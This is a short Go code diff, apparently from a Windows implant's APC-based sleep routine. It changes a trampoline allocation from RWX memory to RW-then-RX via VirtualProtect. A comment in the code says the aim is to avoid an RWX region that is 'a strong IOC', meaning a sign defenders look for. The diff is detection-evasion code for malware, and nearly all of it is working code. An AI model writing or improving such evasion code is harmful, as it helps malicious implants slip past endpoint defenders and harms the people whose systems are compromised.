@@ -33,8 +33,8 @@ import (
 )
 
 const (
-	pageReadWrite        uintptr = 0x04
-	pageExecuteReadWrite uintptr = 0x40
+	pageReadWrite   uintptr = 0x04
+	pageExecuteRead uintptr = 0x20
 
 	memCommit  uintptr = 0x1000
 	memReserve uintptr = 0x2000
@@ -554,18 +554,31 @@ func Sleep(sleepMs uint64) error {
 		return err
 	}
 
-	// Trampoline in an RWX region OUTSIDE the image mapping.
+	// Trampoline lives OUTSIDE the image mapping. Allocate as RW, copy
+	// the bytes in, then flip to RX before executing -- avoids ever
+	// having an RWX region outside the image, which is a strong IOC.
 	tramp, _, _ := procVirtualAlloc.Call(
 		0,
 		uintptr(len(trampoline)),
 		memCommit|memReserve,
-		pageExecuteReadWrite,
+		pageReadWrite,
 	)
 	if tramp == 0 {
 		return errors.New("apc: VirtualAlloc for trampoline failed")
 	}
 	defer procVirtualFree.Call(tramp, 0, memRelease)
 	copy(unsafe.Slice((*byte)(unsafe.Pointer(tramp)), len(trampoline)), trampoline)
+
+	var oldProt uint32
+	vpRet, _, _ := procVirtualProtect.Call(
+		tramp,
+		uintptr(len(trampoline)),
+		pageExecuteRead,
+		uintptr(unsafe.Pointer(&oldProt)),
+	)
+	if vpRet == 0 {
+		return errors.New("apc: VirtualProtect trampoline to RX failed")
+	}
 
 	args := &apcArgs{
 		imageBase: imageBase,
